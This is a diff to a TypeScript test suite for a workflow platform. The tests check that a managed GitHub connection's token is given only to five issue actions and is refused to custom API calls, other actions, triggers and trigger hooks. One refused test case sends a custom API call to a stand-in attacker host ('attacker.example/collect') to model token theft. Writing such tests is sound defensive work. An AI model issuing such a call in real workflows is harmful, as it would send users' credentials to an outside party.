@@ -70,6 +70,9 @@ const pieces = new PieceCatalog([
       { name: "url", label: "", type: "json", required: false },
       { name: "method", label: "", type: "string", required: false },
     ] } },
+    create_branch: { name: "create_branch", displayName: "", description: "" },
+  }, triggers: {
+    new_issue: { name: "new_issue", displayName: "", description: "" },
   } },
 ] as any);
 
@@ -359,6 +362,8 @@ describe("managed GitHub is scoped to GitHub steps", () => {
   const create = (input: Record<string, unknown> = { auth: ref }, nextAction?: any): any => ({
     name: "create", type: "PIECE", settings: { pieceName: GITHUB, actionName: "github_create_issue", input }, ...(nextAction ? { nextAction } : {}),
   });
+  const githubTrigger = (extra: Record<string, unknown> = {}): any => ({ name: "trigger", type: "PIECE_TRIGGER",
+    settings: { pieceName: GITHUB, triggerName: "new_issue", input: { auth: ref }, ...extra } });
   const githubCall = (url: string): any => ({ name: "call", type: "PIECE",
     settings: { pieceName: GITHUB, actionName: "custom_api_call", input: { auth: ref, method: "GET", url: { url } } } });
   const refused: Array<[string, any]> = [
@@ -369,6 +374,12 @@ describe("managed GitHub is scoped to GitHub steps", () => {
     ["a GitHub custom API call to another host", empty(githubCall("https://attacker.example/collect"))],
     ["a GitHub custom API call to plain http on its own host", empty(githubCall("http://api.github.com/user"))],
     ["a GitHub custom API call to github.com instead of its API host", empty(githubCall("https://github.com/login"))],
+    // Defense in depth: only the five managed issue actions get the token, even on GitHub's own API host.
+    ["a GitHub custom API call to a path under its API", empty(githubCall("/user"))],
+    ["a GitHub custom API call on api.github.com", empty(githubCall("https://api.github.com/user"))],
+    ["a GitHub action outside the managed issue actions", empty({ name: "branch", type: "PIECE", settings: { pieceName: GITHUB, actionName: "create_branch", input: { auth: ref } } })],
+    ["a GitHub trigger", githubTrigger()],
+    ["a GitHub trigger that also carries a managed actionName", githubTrigger({ actionName: "github_create_issue" })],
   ];
   for (const [label, trigger] of refused) {
     test(`${label} is not ready and the route refuses it`, async () => {
@@ -382,13 +393,22 @@ describe("managed GitHub is scoped to GitHub steps", () => {
     const [issue] = bindingIssues(empty(code({ conn: ref })));
     expect(issue!.message).toBe("Managed connection jarvis:github can only be used by GitHub steps");
     expect(issue!.allowedPieces).toEqual([GITHUB]);
-    const [call] = bindingIssues(empty(githubCall("https://attacker.example/collect")));
-    expect(call!.message).toBe("A custom API call with managed connection jarvis:github must use a path under the GitHub API or an https URL on api.github.com");
+    const [call] = bindingIssues(empty(githubCall("https://api.github.com/user")));
+    expect(call!.message).toBe("This GitHub connection does not support this action or trigger yet");
   });
-  // The connection scope only: the managed GitHub action list still refuses a custom API call at dispatch.
-  test("a GitHub step auth, or a custom API call on api.github.com, passes the connection scope and resolves", async () => {
-    for (const trigger of [empty(create()), empty(githubCall("/user")), empty(githubCall("https://api.github.com/user"))]) {
-      expect(bindingIssues(trigger)).toEqual([]);
+  test("a trigger hook of a GitHub trigger is refused the token", async () => {
+    for (const trigger of [githubTrigger(), githubTrigger({ actionName: "github_create_issue" })]) {
+      const flow = createFlow({});
+      const version = createDraftVersion({ flowId: flow.id, displayName: "Hook", trigger });
+      const response = await fetchFor(triggerHookRunId("poll", flow.id, version), "jarvis:github");
+      expect(response.status).toBe(403);
+      expect(await response.text()).not.toContain(GITHUB_TOKEN);
+    }
+  });
+  test("every managed GitHub issue action's auth passes the connection scope and resolves", async () => {
+    for (const actionName of ["github_create_issue", "getIssueInformation", "update_issue", "find_issue", "createCommentOnAIssue"]) {
+      const trigger = empty({ name: "step", type: "PIECE", settings: { pieceName: GITHUB, actionName, input: { auth: ref } } });
+      if (actionName === "github_create_issue") expect(bindingIssues(trigger)).toEqual([]);
       const response = await fetchFor(runOf(trigger), "jarvis:github");
       expect(response.status).toBe(200);
       expect(await response.json()).toMatchObject({ type: "OAUTH2", pieceName: GITHUB, value: { access_token: GITHUB_TOKEN, jarvis_managed: "github" } });
